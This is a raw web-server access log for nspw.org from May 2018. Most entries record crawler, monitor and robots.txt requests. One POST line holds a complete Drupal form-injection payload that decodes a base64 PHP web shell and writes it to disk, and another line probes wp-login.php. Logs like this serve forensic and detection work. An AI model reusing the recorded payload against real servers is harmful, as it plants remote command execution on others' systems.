www.nspw.org:80 40.77.167.108 - - [01/May/2018:02:45:32 -0400] "GET /papers/1999/nspw1999-lipson.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:02:45:50 -0400] "GET /proceedings/2010 HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:02:47:06 -0400] "GET /2009/proceedings/2001/nspw2001-foley.pdf HTTP/1.1" 302 609 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:02:47:08 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:47:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 199.47.87.140 - - [01/May/2018:02:48:24 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
www.nspw.org:80 199.47.87.140 - - [01/May/2018:02:48:25 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:49:14 -0400] "GET /papers/1999/nspw1999-markham.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 1.186.106.98 - - [01/May/2018:02:50:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 1.186.106.98 - - [01/May/2018:02:50:40 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.108 - - [01/May/2018:02:51:25 -0400] "GET /papers/2001/nspw2001-foley.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.65.119 - - [01/May/2018:02:52:30 -0400] "GET /papers/2011/nspw2011-gutmann.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:52:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.192 - - [01/May/2018:02:53:12 -0400] "GET /papers/2006/nspw2006-naegoe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:02:54:13 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:02:55:28 -0400] "GET /2009/proceedings/1993/nspw1993-lapadula.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
